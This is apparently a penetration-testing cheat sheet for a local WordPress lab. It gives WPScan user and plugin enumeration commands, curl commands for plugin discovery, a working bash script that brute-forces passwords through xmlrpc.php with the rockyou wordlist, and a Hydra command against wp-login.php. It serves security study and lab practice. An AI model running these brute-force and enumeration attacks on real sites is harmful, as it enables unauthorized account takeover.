WPScan

Main tool for WordPress enumeration.

Basic scan

wpscan --url http://127.0.0.1:31337

Enumerate users and plugins

wpscan --url http://127.0.0.1:31337 -e vp,u

vp → vulnerable plugins

u → users

WPScan with API Token

Retrieve real vulnerability data.

https://wpscan.com/profile
wpscan --url http://127.0.0.1:31337 -e vp,u --api-token="API_KEY"
Additional Enumeration

Themes

wpscan --url http://target -e t

Full enumeration

wpscan --url http://target -e ap,at,tt,cb,dbe,u
Manual Plugin Enumeration

Find plugins with curl

curl -s -X GET "http://localhost:31337/" | grep plugins
curl -s -X GET "http://localhost:31337/" | grep -oP 'plugins/\K[^/]+' | sort -u

Search exploits after identifying plugins.

Credential Identification

Wrong response:

Incorrect username or password

Correct credentials → different response

Brute Force Script
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Exiting...";
    exit 1
}

trap ctrl_c SIGINT

function createXML(){
    password=$1

    xmlFile="
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>jose</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"

    echo $xmlFile > file.xml

    response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)

    if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
        echo -e "\n[+] Password found: $password"
        exit 0
    fi
}

cat /usr/share/wordlists/wordlists/rockyou.txt | while read password; do
    createXML $password
done

Hydra (HTTP POST)

Target login endpoint:

/wp-login.php

Basic syntax:

hydra -l jose -P /usr/share/wordlists/wordlists/rockyou.txt 127.0.0.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Invalid username"

Notes

  • ^USER^ → username
  • ^PASS^ → password
  • F= → failure message (important!)
